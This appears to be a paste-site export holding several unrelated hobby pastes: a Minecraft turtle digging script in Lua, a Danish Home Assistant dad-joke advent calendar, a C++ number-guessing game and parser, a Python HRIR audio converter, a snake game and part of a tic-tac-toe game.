	if curZ == 0 and theta*b < 5 then 
		table.insert(directions, 0)
		table.insert(directions, 2)
	end
	if curX == 0 and theta*b < 5 then 
		table.insert(directions, 1)
		table.insert(directions, 3)
	end
	return directions
end
	


function Dry(direction)
			if string.find(direction, ""d"") then
				--there is water below
				setCobble(""d"")
			else 
				--there is water in front
				Forward()
				TLeft()
				for i=1,3,1 do
					local success, data = turtle.inspect()
         			if success then
						--print(curX,"","",curZ,"","",facing,"","",facingOut())
           				if string.find(data.name, ""water"") and facingOut() then
							setCobble(""f"")
						elseif string.find(data.name, ""seagrass"") or 
							   string.find(data.name, ""kelp"")  and facingOut() then
								turtle.dig()
								setCobble(""f"")
						end
					end
					TRight()
				end
				Forward()
				TRight()
				TRight()
				setCobble(""f"")
				turtle.dig()
			end
end

function report(out)
	--term.clear()
	print(""theta="", theta, ""fuel="", turtle.getFuelLevel())
	print(out)
end

function returnUp()
		local radius = math.sqrt(curX*curX + curZ*curZ)
		while curY < -1 do
			turtle.select(2)
			Up()
			if radius < R_base then 
				--we're in the area to make the stairs and the lava column
				if  (curY + math.floor(2*math.atan2(curX,curZ))) % 12 == 0 and theta > 9.2  or 
					(math.abs(curX) == 1 and math.abs(curZ)==1) or 
					(curX==0 and math.abs(curZ)==2) or 
					(curZ==0 and math.abs(curX)==2) then
					setCobble(""d"")
				end
			elseif radius <= R_max and radius < R_base + (R_max - R_base)*2^((curY + top_column_height) / R_decay) then
					--we're in the region to put regular floors
					if curY % Floor_Spacing ==0 or radius > R_max - 1 then 
						setCobble(""d"")
					end 
			end 
		end 
		--place the cobbles at the top (YY=-1)
		Up()
			setCobble(""d"")  		--place a cobblestone in this location to mark it as done
end

--Start the program



columnX = 0	--location to dig out a column
columnY = 0
oldXX = 0   --previous XX and ZZ positions
oldZZ = 0
XX = 0
ZZ = 0
while math.abs(theta) < R_hole/b do 
	--find the next (XX,ZZ)
	--first change theuntil we get to a new column
	--print(""new column"")
	print(""theta="", theta, "" , fuel="" , turtle.getFuelLevel())
	if theta ~= 0 then 
		while ((XX == oldXX) and (ZZ == oldZZ)) do
			theta = theta + step
			XX = math.floor(b*theta * math.cos(theta)+0.5)
			ZZ = math.floor(b*theta * math.sin(theta)+0.5)
		end
	else 
		theta = theta + step
	end
	--now the column has changed, but is it really one we've never done before?	
	MoveTo(XX,curY,ZZ)
	MoveTo(XX,0,ZZ)
	oldXX = XX
	oldZZ = ZZ
	turtle.digUp()
	--determine which color to place upward
	if math.floor(theta / (6.28318531/ numStripes) + (theta/swirlFactor)) % 2 == 0 then 
		turtle.select(1)
		turtle.placeUp()
		if turtle.getItemCount() == 1 then 
			for i=8,2,-1 do
				turtle.select(i)
				turtle.transferTo(1)
			end
		end
		turtle.select(1)
		while turtle.getItemCount() == 1 do
			print(""Please reload"")
			sleep(1)
		end
	else 
		turtle.select(9)
		turtle.placeUp()
		if turtle.getItemCount() == 1 then 
			for i=16,10,-1 do
				turtle.select(i)
				turtle.transferTo(9)
			end
		end
		turtle.select(9)
		while turtle.getItemCount() == 1 do
			print(""Please reload"")
			sleep(1)
		end
	end
end
MoveTo(0,0,0)"
qszeQHTD,Far-joke automatisering til at skjule svar ved midnat,marlar,YAML,Tuesday 5th of December 2023 03:47:47 AM CDT,"alias: Nulstil far-joke visning af svar
description: ''
trigger:
  - platform: time
    at: '00:00:00'
condition: []
action:
  - service: input_boolean.turn_off
    data: {}
    target:
      entity_id: input_boolean.dad_joke_toggle
mode: single
"
1CGXUJyi,Far-joke julekalender med knap til svarvisning,marlar,YAML,Tuesday 5th of December 2023 03:39:27 AM CDT,"type: horizontal-stack
cards:
  - show_name: true
    show_icon: true
    type: button
    tap_action:
      action: toggle
    entity: input_boolean.dad_joke_toggle
    name: Vis svar
    icon: mdi:emoticon-cool-outline
    show_state: false
    hold_action:
      action: none
  - type: markdown
    content: >
      {% set day = now().day %} {% set month = now().month %}

      {% set dad_jokes = {
            1: ""Hvad er blåt og lugter af gul maling?"",
            2: ""Hvorfor lå brevene på bordet?"",
            3: ""Hvad kalder man en nisse som arbejder på et elværk?"",
            4: ""Hvad hedder nissen i julesangen:"",
            5: ""Hvad laver tømreren til fyraften?"",
            6: ""Hvad kalder man rodfrugter man praktisk talt får gratis?"",
            7: ""Hvordan bliver man ekspert i tordenvejr?"",
            8: ""Hvorfor gik koen på teknisk skole?"",
            9: ""Hvad kalder man en betjent til hest?"",
            10: ""Hvilket dyr samler flest flasker?"",
            11: ""Hvor sover alkoholikere bedst?"",
            12: ""Hvad var det første mangoen lærte i skolen?"",
            13: ""Har du hørt om ham der stjal kalenderen?"",
            14: ""Hvad må man aldrig servere til en blind?"",
            15: ""Hvordan siger man 'spion-perler' på engelsk?"",
            16: ""Hvilket bilmærke har flest el-biler?"",
            17: ""Hvad kalder man en hurtig vandrende pind?"",
            18: ""Hvorfor gemmer spion-sneglen Egon sig aldrig i nedløbsrør?"",
            19: ""Når jeg en gang i mellem hilser på en Spanier, husker jeg altid at sige 'Mucho' til dem."",
            20: ""Må man sende en mail til en indsat i fængsel?"",
            21: ""Hvad hedder manden med en and under hver arm?"",
            22: ""Min bil er så muslimsk.."",
            23: ""Hvad er den sværeste del af en grøntsag at få igennem en kødhakker?"",
            24: ""Hvad er det bedste ved at være urmager..?""
          }
      %} {%
          set dad_jokes_answers = {
            1: ""Blå maling"",
            2: ""Fordi de kuverter."",
            3: ""En vatnisse"",
            4: ""'På loftet sidder nissen med sin julegrød'? Han hedder Teddy Ring (Og de står om nissen tæt i ring)"",
            5: ""Lige hvad der passer ham (vaterpasser)"",
            6: ""Kastinakker."",
            7: ""Man tager et lynkursus."",
            8: ""For at lære at blive Muhrer"",
            9: ""En regelrytter"",
            10: ""Panteren."",
            11: ""I ginseng"",
            12: ""Mangoe ting"",
            13: ""Han fik 12 måneder"",
            14: ""Kikærter, glosuppe og sesam."",
            15: ""Spy-perls (spegepølse)"",
            16: ""Op-el"",
            17: ""En sportsgren!"",
            18: ""Fordi sidst blev han regnet ud!"",
            19: ""Min spansklærer sagde nemlig at det betyder meget for dem."",
            20: ""Det må man gerne, man må bare ikke vedhæfte en fil."",
            21: ""Finn med 2 'N'er (udtales “ænder”)"",
            22: ""At selv rattet har slør."",
            23: ""Kørestolen"",
            24: ""Man skal bare have tiden til at gå..""
          }
      %} {% if month == 12 and day in dad_jokes %}###  Far-joke julekalender
       Den {{ day }}. december
        #### {{ dad_jokes[day] }}
      {% if states(""input_boolean.dad_joke_toggle"")=='on' %}{{
      dad_jokes_answers[day] }} 🤣️🤪️ {% endif %}
        {% else %}
          ### Far joke Julekalender
        Venter på december!
        {% endif %}
"
nw164D38,1A2B,excellent940707,C++,Tuesday 5th of December 2023 03:38:16 AM CDT,"#include<bits/stdc++.h>
using namespace std;

bool check_duplicate(vector<int> v){
     /*
     接收vector<int> 型態別的變數
     檢測v陣列中有無重複數值
     無重複回傳TRUE
     */
     int flag[10]={0};
     for(int i=0;i<v.size();++i){
          flag[v[i]]+=1;
          if(flag[v[i]]>1)return 0;
     }
     return 1;
}

bool check_length(int num, int length){
     /*
     接收vector<int> 型態別的變數int型態別的變數代表需求長度
     檢測v陣列長度是否符合需求長度
     長度正確回傳TRUE
     */
     int digit=0;
     while(num){
          num/=10;
          digit++;
     }
     return length==digit;
}

vector<int> input(int length){
     /*
     接收int型態別的變數代表需求長度
     處理輸入數字轉陣列的部分，回傳值型態別為vector<int>
     保證回傳陣列符合需求長度且無重複數值
     */
     vector<int> v(length);
     cout<<""Please input number: "";
     while(true){
          int num,idx=length-1;
          cin>>num;
          if(!check_length(num, length)){
               cout<<""Wrong input length\n"";
               continue;
          }
          while(num){
               v[idx--]=num%10;
               num/=10;
          }
          if(!check_duplicate(v)){
               cout<<""Duplicate numbers are not allowed\n"";
               continue;
          }else{
               break;
          }
     }
     return v;
}

vector<int> set_number(int length, bool user_create=0){
     /*
     接收int型態別的變數代表需求長度和bool型態別的變數代表是否需要隨機生成數列
     處理生成答案數列的部分，回傳值型態別為vector<int>
     保證回傳陣列符合需求長度且無重複數值
     */
     bool flag[10]={0};
     vector<int> v(length);
     if(user_create){
          return input(length);
     }
     for(int i=0,tmp;i<length;++i){
          do{
               tmp = rand()%10;
          }while(flag[tmp]);
          flag[tmp]=1;
          v[i]=tmp;
     }
     return v;
}

bool calculate(vector<int> ans, vector<int> input){
     int a_num=0, b_num=0;
     for(int i=0;i<input.size();++i){
          for(int j=0;j<ans.size();++j){
               if(ans[j]==input[i]){
                    if(i==j)a_num++;
                    else b_num++;
               }
          }
     }
     cout<<a_num<<'A'<<b_num<<""B""<<'\n';
     
     return ans.size()==a_num;
}

bool deter(vector<int> ans, vector<int> input)
{
     int n=ans.size();
     int A=0,B=0;
     for(int i=0;i<n;i++)
     {
          if(ans[i]==input[i])
          {
               A++;
          }
          else
          {
               for(int count=0;count<n;count++)
               {
                    if(input[i]==ans[count])
                    {
                         B++;
                         break;
                    }
               }
          }
     }
     cout<<A<<""A""<<B<<""B""<<'\n';
     return A==n;
}
void single_mode(){
     //單人遊戲模式主函式
     vector<int> ans, tmp;
     int length;
     string create;

     cout<<""set length: "";
     cin>>length;
     cout<<""Do you want to randomly generate numbers?(Yes or No) "";
     while(true){
          cin>>create;
          if(create==""Yes""){
               ans = set_number(length);
               break;
          }else if(create==""No""){
               ans = set_number(length, 1);
               break;
          }else{
               cout<<""Please input Yes or No\n"";
          }
     }

     cout<<""Game Start\n"";
     while(true){
          cout<<""Please enter your answer: "";
          tmp = input(length);
          if(deter(ans, tmp)){
               cout<<""You win!!!!\n"";
               break;
          }
     }
}

int main(){
     srand(time(NULL));
     single_mode();
     return 0;
}"
qGuMX6P0,HRIR Generator,AyPeeEye,Python,Tuesday 5th of December 2023 03:35:01 AM CDT,"# 7.1 + stereo HeSuVi HRIR generator
# Made by AyPeeEye in collaboration with ChatGPT
# requires the library soundfile-0.12.1 and Python version 3.8 (may work with other versions but no guarantees)
import tkinter as tk
from tkinter import filedialog
import soundfile as sf

# Function to create and write to a peace preset output file
def generate_hrir_file(file_paths, output_filename):
    num_channels = 0
    for path in enumerate(file_paths):
        if path[1] != ""None"":
            num_channels += 1
    if (num_channels != 1) and (num_channels != 2) and (num_channels != 7):
        return 1    # Not a supported speaker configuration
    if num_channels == 2 and (file_paths[1] == ""None"" or file_paths[2] == ""None""):
        return 2    # Wrong channel config for stereo
    if num_channels == 1 and (file_paths[0] == ""None""):
        return 5    # Wrong channel config for HeSuVi to stereo
    
    # HeSuVi to stereo
    if num_channels == 1:
        channel_data, samplerate = sf.read(file_paths[0])
        if len(channel_data[1]) != 14:
            return 6    # Not a 14 channel HeSuVi file
        fl_left = channel_data[:, 0]  # Extract left channel
        fl_right = channel_data[:, 1]  # Extract right channel
        fr_left = channel_data[:, 7]  # Extract left channel
        fr_right = channel_data[:, 8]  # Extract right channel        
        
        # Create a 4-channel file by combining left and right channels
        # Here we'll duplicate the left and right channels to create a 4-channel file
        four_channel_data = [fl_left, fl_right, fr_left, fr_right]
        
        # Reshape the data into a 4-channel format
        four_channel_data = list(map(list, zip(*four_channel_data)))  # Interleave the channels
        
        # Save the 4-channel audio data
        sf.write(output_filename+'.wav', four_channel_data, samplerate, format='WAV', subtype='PCM_24')
        return 0    # Generation finished without errors
    
    # Stereo HRIR generator
    if num_channels == 2:
        stereo_data_fl, samplerate_0 = sf.read(file_paths[1])
        if stereo_data_fl.shape[1] != 2:
            return 3    # File not stereo
        stereo_data_fr, samplerate_1 = sf.read(file_paths[2])
        if stereo_data_fr.shape[1] != 2:
            return 3    # File not stereo
        if samplerate_0 != samplerate_1:
            return 4    # Not the same sample rate
        fl_left = stereo_data_fl[:, 0]  # Extract left channel
        fl_right = stereo_data_fl[:, 1]  # Extract right channel
        fr_left = stereo_data_fr[:, 0]  # Extract left channel
        fr_right = stereo_data_fr[:, 1]  # Extract right channel        
        
        # Create a 4-channel file by combining left and right channels
        # Here we'll duplicate the left and right channels to create a 4-channel file
        four_channel_data = [fl_left, fl_right, fr_left, fr_right]
        
        # Reshape the data into a 4-channel format
        four_channel_data = list(map(list, zip(*four_channel_data)))  # Interleave the channels
        
        # Save the 4-channel audio data
        sf.write(output_filename+'.wav', four_channel_data, samplerate_0, format='WAV', subtype='PCM_24')
        return 0    # Generation finished without errors
    
    # 7.1 HRIR generator
    if num_channels == 7:
        stereo_data_fl, samplerate_0 = sf.read(file_paths[1])
        if stereo_data_fl.shape[1] != 2:
            return 3    # File not stereo
        stereo_data_fr, samplerate_1 = sf.read(file_paths[2])
        if stereo_data_fr.shape[1] != 2:
            return 3    # File not stereo
        stereo_data_fc, samplerate_2 = sf.read(file_paths[3])
        if stereo_data_fc.shape[1] != 2:
            return 3    # File not stereo
        stereo_data_rl, samplerate_3 = sf.read(file_paths[4])
        if stereo_data_rl.shape[1] != 2:
            return 3    # File not stereo
        stereo_data_rr, samplerate_4 = sf.read(file_paths[5])
        if stereo_data_rr.shape[1] != 2:
            return 3    # File not stereo
        stereo_data_sl, samplerate_5 = sf.read(file_paths[6])
        if stereo_data_sl.shape[1] != 2:
            return 3    # File not stereo
        stereo_data_sr, samplerate_6 = sf.read(file_paths[7])
        if stereo_data_sr.shape[1] != 2:
            return 3    # File not stereo
        samplerates = [samplerate_0, samplerate_1, samplerate_2, samplerate_3, samplerate_4, samplerate_5, samplerate_6]
        for i in range(1, len(samplerates)):
            if samplerates[0] != samplerates[i]:
                return 4    # Not the same sample rate
        fl_left = stereo_data_fl[:, 0]  # Extract left channel
        fl_right = stereo_data_fl[:, 1]  # Extract right channel
        fr_left = stereo_data_fr[:, 0]  # Extract left channel
        fr_right = stereo_data_fr[:, 1]  # Extract right channel        
        fc_left = stereo_data_fc[:, 0]  # Extract left channel
        fc_right = stereo_data_fc[:, 1]  # Extract right channel
        rl_left = stereo_data_rl[:, 0]  # Extract left channel
        rl_right = stereo_data_rl[:, 1]  # Extract right channel    
        rr_left = stereo_data_rr[:, 0]  # Extract left channel
        rr_right = stereo_data_rr[:, 1]  # Extract right channel
        sl_left = stereo_data_sl[:, 0]  # Extract left channel
        sl_right = stereo_data_sl[:, 1]  # Extract right channel    
        sr_left = stereo_data_sr[:, 0]  # Extract left channel
        sr_right = stereo_data_sr[:, 1]  # Extract right channel
        
        # Create a 14-channel file by combining left and right channels
        # Here we'll duplicate the left and right channels to create a 14-channel file
        fourteen_channel_data = [fl_left, fl_right, sl_left, sl_right, rl_left, rl_right, fc_left, fr_right, fr_left, sr_right, sr_left, rr_right, rr_left, fc_right]
        
        # Reshape the data into a 14-channel format
        fourteen_channel_data = list(map(list, zip(*fourteen_channel_data)))  # Interleave the channels
        
        # Save the 14-channel audio data
        sf.write(output_filename + '.wav', fourteen_channel_data, samplerate_0, format='WAV', subtype='PCM_24')
        return 0    # Generation finished without errors
        


# Function to open file explorer and update the corresponding entry field
def open_file_explorer(entry):
    file_path = filedialog.askopenfilename(title=""Select wav file"", filetypes=[(""WAV files"", ""*.wav;*.wave"")])
    entry.delete(0, tk.END)
    entry.insert(0, file_path)

message_colors = [""blue"", ""green""]
color_index = 0
message_label = None

# Function to handle the conversion
def convert_files():
    global color_index
    global message_label
    output_filename = output_filename_entry.get() or ""output""
    paths = [entry.get() or ""None"" for entry in entry_fields]

    message = generate_hrir_file(paths, output_filename)
    
    # Clear the previous completion message, if exists
    if message_label is not None:
        message_label.destroy()
    
    if message == 0:
        # Add a message on the GUI to inform the user that the file generation is complete
        message_label = tk.Label(root, text=""File generation completed!"", fg=message_colors[color_index])
        message_label.pack()
        # Update the color index for the next message
        color_index = (color_index + 1) % len(message_colors)
    if message == 1:
        # error 1
        message_label = tk.Label(root, text=""Not a supported speaker configuration"", fg=""red"")
        message_label.pack()
    if message == 2:
        # error 2
        message_label = tk.Label(root, text=""Wrong channel configuration for stereo"", fg=""red"")
        message_label.pack()
    if message == 3:
        # error 3
        message_label = tk.Label(root, text=""One of the files was not in stereo format"", fg=""red"")
        message_label.pack()
    if message == 4:
        # error 4
        message_label = tk.Label(root, text=""Files do not have the same sample rate"", fg=""red"")
        message_label.pack()
    if message == 5:
        # error 4
        message_label = tk.Label(root, text=""Wrong channel for HeSUVi to stereo conversion"", fg=""red"")
        message_label.pack()
    if message == 6:
        # error 4
        message_label = tk.Label(root, text=""HeSuVi file does not have 14 channels"", fg=""red"")
        message_label.pack()
    
# Creating the main application window
root = tk.Tk()
root.title(""IR wav HRIR Converter"")

# List to store entry fields and their respective names
entry_fields = []
field_names = [""HeSuVi"", ""Left"", ""Right"", ""Center"", ""Left Rear"", ""Right Rear"", ""Left Side"", ""Right Side""]

# Function to create file input fields with respective names
def create_file_input(name):
    frame = tk.Frame(root)
    frame.pack()
    label = tk.Label(frame, text=f""{name}:"")
    label.pack(side=tk.LEFT)
    entry = tk.Entry(frame, width=50)
    entry.pack(side=tk.LEFT)
    entry_fields.append(entry)
    browse_button = tk.Button(frame, text=""Browse"", command=lambda: open_file_explorer(entry))
    browse_button.pack(side=tk.LEFT)

# Create file input fields with respective names
for name in field_names:
    create_file_input(name)
    
# Entry field for the output file name
output_filename_label = tk.Label(root, text=""Output File Name:"")
output_filename_label.pack()
output_filename_entry = tk.Entry(root, width=50)
output_filename_entry.pack()

# Button to trigger the conversion process
convert_button = tk.Button(root, text=""Convert Files"", command=convert_files)
convert_button.pack()

# Run the application
root.mainloop()
"
xMtjrhTj,III,AleksandarH,C++,Tuesday 5th of December 2023 03:34:40 AM CDT,"#include <iostream>
#include <string>
#include <regex>
#include <fstream>

using namespace std;

typedef enum TSymbolType {
    integer, text, semicolon, period, quotas, othersy
} TSymbol;

const char* SymbolNames[] = {
    ""integer"", ""text"", ""semicolon"", ""period"", ""quotas"", ""othersy""
};

TSymbol Symbol;
const int MAXLENGTH = 255;
const int MAXINTEGER = 1000000;
char Spelling[MAXLENGTH];
int Constant = 0;
char Char;

ifstream inputFile(""C://Users//Aleksandar//source//repos//Parser//Parser//input.txt"");

void error(const char* str) {
    cerr << ""Error: "" << str << endl;
    exit(EXIT_FAILURE);
}

void GetNextChar() {
    inputFile.get(Char);
}

void GetNextSymbol() {
    while (Char == ' ') {
        GetNextChar();
    }

    switch (Char) {
    case '0':
    case '1':
    case '2':
    case '3':
    case '4':
    case '5':
    case '6':
    case '7':
    case '8':
    case '9': {
        Constant = 0;
        while (Char >= '0' && Char <= '9') {
            int digit = Char - '0';
            if (Constant < MAXINTEGER / 10 || (Constant == MAXINTEGER / 10 && digit <= MAXINTEGER % 10)) {
                Constant = 10 * Constant + digit;
            }
            else {
                error(""Integer constant too large."");
                Constant = 0;
            }
            GetNextChar();
        }
        Symbol = integer;
    } break;
    case 'A': case 'B': case 'C': case 'D': case 'E': case 'F': case 'G':
    case 'H': case 'I': case 'J': case 'K': case 'L': case 'M': case 'N':
    case 'O': case 'P': case 'Q': case 'R': case 'S': case 'T': case 'U':
    case 'V': case 'W': case 'X': case 'Y': case 'Z':
    case 'a': case 'b': case 'c': case 'd': case 'e': case 'f': case 'g':
    case 'h': case 'i': case 'j': case 'k': case 'l': case 'm': case 'n':
    case 'o': case 'p': case 'q': case 'r': case 's': case 't': case 'u':
    case 'v': case 'w': case 'x': case 'y': case 'z': {
        int k = 0;
        do {
            if (k < MAXLENGTH) {
                Spelling[k] = toupper(Char);
                k++;
            }
            GetNextChar();
        } while (isalnum(Char));
        Spelling[k] = '\0';
        Symbol = text;
    } break;

    case ';': {
        Symbol = semicolon;
        GetNextChar();
    } break;

    case '.': {
        Symbol = period;
        GetNextChar();
    } break;

    case '""': {
        Symbol = quotas;
        GetNextChar();
    } break;

    default: {
        Symbol = othersy;
        GetNextChar();
    } break;
    }


}

int accept(TSymbol sym) {
    if (Symbol == sym) {
        GetNextSymbol();
        return 1;
    }
    return 0;
}

int expect(TSymbol sym) {
    if (accept(sym))
        return 1;
    error(""Expected symbol not found."");
    return 0;
}

void Field() {
    if (accept(integer)) {
        cout << ""Integer: "" << Constant << endl;
    }
    else if (accept(quotas)) {
        cout << ""String: "" << Spelling << endl;
        if (Symbol == period) {
            accept(period);
            Field();
        }
        else {
            expect(text);
            expect(quotas);
        }
    }
    else {
        error(""Field expects integer or string."");
    }
}

void Record() {
    Field();
    while (Symbol == semicolon || Symbol == period) {
        if (Symbol == semicolon) {
            accept(semicolon);
        }
        else {
            accept(period);
        }
        Field();
    }
}

void DataFile() {
    GetNextSymbol();
    Record();
}

int main() {
    if (!inputFile.is_open()) {
        error(""Unable to open file."");
    }
    GetNextChar();
    DataFile();
    inputFile.close();
    return 0;
}"
XDLf6EM2,Snake using Turtle 4.0 (Obstacle + Rainbow),AlphaPenguino,Python,Tuesday 5th of December 2023 03:28:05 AM CDT,"import turtle
import time
import random
import colorsys

delay = 0.1
game_Started = False
restartable = False

score = 0
hi_score = 100

wn = turtle.Screen()
wn.title(""The Ultimate Snake Game"")
wn.bgcolor(""#476A77"")
wn.setup(width = 600, height = 600)
wn.tracer(0)

head = turtle.Turtle()
head.speed(0)
head.color(""pink"")
head.shape(""triangle"")
head.penup()
head.goto(0,0)
head.direction = ""stop""

segments = []

food = turtle.Turtle()
food.speed(0)
food.shape(""circle"")
food.color(""red"")
food.penup()
food.goto(0,100)

obstacles = []

pen_text = turtle.Turtle()
pen_text.speed(0)
pen_text.shape(""square"")
pen_text.color(""white"")
pen_text.clear()
pen_text.penup()
pen_text.hideturtle()
pen_text.goto(0, 260)
pen_text.goto(0, 0)
pen_text.write(""Snake Game Original by Josh Mojica"", align=""center"", font=('Bauhaus 93', 25, ""bold""))
pen_text.goto(-100, -100)
pen_text.write(""Press 'space' to Start"", align=""center"", font=('Grotesque', 12, ""bold""))
pen_text.goto(100, -100)
pen_text.write(""Press 'X' to Exit the game"", align=""center"", font=('Grotesque', 12, ""bold""))
pen_text.goto(-100, -260)
pen_text.write(""Zunder Jacob A. Pacis"", align=""center"", font=('Grotesque', 12, ""bold""))
moveset = [""w"", ""a"", ""s"", ""d""]


def create_obstacle():
    obstacle = turtle.Turtle()
    obstacle.shape(""square"")
    obstacle.color(""black"")
    obstacle.penup()
    obstacle.speed(0)
    obstacle.goto(random.randint(-280, 280), random.randint(-280, 280))
    obstacles.append(obstacle)

def remove_obstacles():
    for obstacle in obstacles:
        obstacle.hideturtle()  # Alternatively, you can use obstacle.clear() to clear the obstacle from the screen
    obstacles.clear()


def generate_rainbow_color(step):
    r, g, b = colorsys.hsv_to_rgb(step, 1, 1)
    return (r, g, b)

def check_collision():
    for obstacle in obstacles:
        if head.distance(obstacle) < 20:
            return True
    return False


def moveUp():
    if head.direction != ""down"":
        head.direction = ""up""
def moveDown():
    if head.direction != ""up"":
        head.direction = ""down""
def moveRight():
    if head.direction != ""left"":
        head.direction = ""right""
def moveLeft():
    if head.direction != ""right"":
        head.direction = ""left""




moveMapping = {""up"": lambda: (head.sety(head.ycor() + 20), head.setheading(90)),""down"": lambda: (head.sety(head.ycor() - 20), head.setheading(270)),""left"": lambda: (head.setx(head.xcor() - 20), head.setheading(180)),""right"": lambda: (head.setx(head.xcor() + 20), head.setheading(0))}
def move():
    moveMapping.get(head.direction, lambda: ())()
    for segment in segments:
        if head.distance(segment) < 20:
            gameOver(score, hi_score)
            time.sleep(1)
            game_started=False
def closeGame():
    if not game_Started:
        turtle.bye()

def restartGame():
    
    global restartable
    if restartable:
        wn.resetscreen
        pen_text.clear()
        turtle.clear()
        head.goto(0,0)
        food.setx(random.randint(-270, 270))
        food.sety(random.randint(-270, 270))
        pen_text.goto(0, 275)

        score = 0
        pen_text.goto(0, 260)
        pen_text.goto(0, 0)
        pen_text.write(""Snake Game Original by Josh Mojica"", align=""center"", font=('Bauhaus 93', 25, ""bold""))
        pen_text.goto(-100, -100)
        pen_text.write(""Press 'space' to Start"", align=""center"", font=('Grotesque', 12, ""bold""))
        pen_text.goto(100, -100)
        pen_text.write(""Press 'X' to Exit the game"", align=""center"", font=('Grotesque', 12, ""bold""))
        pen_text.goto(-100, -260)
        pen_text.write(""Zunder Jacob A. Pacis"", align=""center"", font=('Grotesque', 12, ""bold""))
        head.hideturtle()
        food.hideturtle()

def placeFood():
    food.hideturtle()
    food.setx(random.randint(-270, 270))
    food.sety(random.randint(-270, 270))
    food.showturtle()

def gameOver(finscore,finalscore):
    global restartable
    remove_obstacles()
    restartable = True
    for segment in segments:
        segment.goto(1000,1000)
    segments.clear()

    pen_text.clear()
    pen_text.goto(0, -50)
    pen_text.write(""Score: {} Hi-score: {}"".format(finscore, finalscore), align=""center"",
                  font=(""Grotesque"", 22, ""bold""))
    turtle.hideturtle()
    turtle.clear()
    turtle.goto(0,0)
    turtle.color(""white"")
    turtle.write(""GAME OVER!"", align=""center"", font=(""Bauhaus 93"", 30, ""bold""))
    pen_text.goto(-80, -100)
    pen_text.write(""Press P to restart"", align=""center"", font=('Times New Roman', 12, ""bold""))
    pen_text.goto(80, -100)
    pen_text.write(""Press X to Exit the game"", align=""center"", font=('Times New Roman', 12, ""bold""))
    pen_text.goto(-100, -260)
    turtle.hideturtle()
    head.goto(0, 10000)
    head.color(""white"")
    head.direction = ""stop""
    food.goto(0, 1000)

    wn.bgcolor(""#476A77"")


def startGame():
    global game_Started, delay, score, hi_score, restartable
    if game_Started:
        return
    game_Started = True
    restartable = False
    wn.bgcolor(""#4B0082"")
    food.showturtle()
    head.showturtle()
    score = 0
    delay = 0.1
    pen_text.clear()
    pen_text.goto(0,260)
    pen_text.write(""Score: {} Hi-score: {}"".format(score, hi_score), align=""center"",
                  font=(""Grotesque"", 22, ""bold""))

    while True:

        wn.update()

        if head.distance(food) < 20:
            score += 5
            create_obstacle()
            placeFood()
            # Generate a rainbow color based on the number of segments
            rainbow_step = len(segments) / 10  # Adjust 10 to control the color transition speed
            rainbow_color = generate_rainbow_color(rainbow_step)
            new_segment = turtle.Turtle()
            new_segment.speed(0)
            new_segment.shape(""circle"")
            new_segment.color(rainbow_color)
            new_segment.penup()
            segments.append(new_segment)


            delay -= 0.001

            if score > hi_score:
                hi_score = score
            pen_text.clear()
            pen_text.write(""Score: {} Hi-score: {}"".format(score, hi_score), align=""center"",
                          font=(""Grotesque"", 22, ""bold""))

        for i in range(len(segments)-1, 0, -1):
            segments[i].setx(segments[i - 1].xcor())
            segments[i].sety(segments[i - 1].ycor())

        if len(segments) > 0:
            segments[0].goto(head.xcor(), head.ycor())

        if head.xcor() > 290 or head.xcor() < -290 or head.ycor() > 290 or head.ycor() < -290:
            game_Started = False
            gameOver(score, hi_score)
            time.sleep(1)

        if check_collision():
            game_Started = False
            gameOver(score, hi_score)
            remove_obstacles()
            break
            time.sleep(1)

        move()
        time.sleep(delay)
wn.listen()
mapping = {""w"": moveUp, ""s"": moveDown, ""a"": moveLeft, ""d"": moveRight, ""space"": startGame, ""x"": closeGame, ""p"": restartGame}
for key, action in mapping.items():
    wn.onkeypress(lambda a=action: a(), key)
wn.mainloop()"
xvYeW3Gg,tick tack to,MR_Rednax,Python,Tuesday 5th of December 2023 03:22:37 AM CDT,"def __init__(self):
    Frame.__init__(self, bg = ""black"")
    self.protocol('WM_DELETE_WINDOW', self.doSomething)
    self.pack(expand = 1, fill = BOTH)

def doSomething(self):
    if showinfo.askokcancel(""Quit?"", ""Are you sure you want to quit?""):
        self.quit()

# Function to print Tic Tac Toe
def print_tic_tac_toe(values):
    print(""\n"")
    print(""\t     |     |"")
    print(""\t  {}  |  {}  |  {}"".format(values[6], values[7], values[8]))
    print('\t_____|_____|_____')
 
    print(""\t     |     |"")
    print(""\t  {}  |  {}  |  {}"".format(values[3], values[4], values[5]))
    print('\t_____|_____|_____')
 
    print(""\t     |     |"")
 
    print(""\t  {}  |  {}  |  {}"".format(values[0], values[1], values[2]))
    print(""\t     |     |"")
    print(""\n"")
 
 
# Function to print the score-board
def print_scoreboard(score_board):
    print(""\t--------------------------------"")
    print(""\t              SCOREBOARD       "")
    print(""\t--------------------------------"")
 
    players = list(score_board.keys())
    print(""\t   "", players[0], ""\t    "", score_board[players[0]])
    print(""\t   "", players[1], ""\t    "", score_board[players[1]])
 
    print(""\t--------------------------------\n"")
 
# Function to check if any player has won
def check_win(player_pos, cur_player):
 
    # All possible winning combinations
    soln = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [1, 4, 7], [2, 5, 8], [3, 6, 9], [1, 5, 9], [3, 5, 7]]
 
    # Loop to check if any winning combination is satisfied
    for x in soln:
        if all(y in player_pos[cur_player] for y in x):
 
            # Return True if any winning combination satisfies
            return True
    # Return False if no combination is satisfied       
    return False       
 
# Function to check if the game is drawn
def check_draw(player_pos):
    if len(player_pos['X']) + len(player_pos['O']) == 9:
        return True
    return False       
 
# Function for a single game of Tic Tac Toe
def single_game(cur_player):
 
    # Represents the Tic Tac Toe
    values = [' ' for x in range(9)]
     
    # Stores the positions occupied by X and O
    player_pos = {'X':[], 'O':[]}
     
    # Game Loop for a single game of Tic Tac Toe
    while True:
        print_tic_tac_toe(values)
         
        # Try exception block for MOVE input
        try:
            print(""Player "", cur_player, "" turn. Which box? : "", end="""")
            move = int(input()) 
        except ValueError:
            print(""Wrong Input!!! Try Again"")
            continue
 
        # Sanity check for MOVE inout
        if move < 1 or move > 9:
            print(""Wrong Input!!! Try Again"")
            continue
 
        # Check if the box is not occupied already
        if values[move-1] != ' ':
            print(""Place already filled. Try again!!"")
            continue
 
        # Update game information
 
        # Updating grid status 
        values[move-1] = cur_player
 
        # Updating player positions
        player_pos[cur_player].append(move)
 
        # Function call for checking win
        if check_win(player_pos, cur_player):
            print_tic_tac_toe(values)
            print(""Player "", cur_player, "" has won the game!!"")     
            print(""\n"")
            return cur_player
 
        # Function call for checking draw game
        if check_draw(player_pos):
            print_tic_tac_toe(values)
            print(""Game Drawn"")
            print(""\n"")
            return 'D'
 
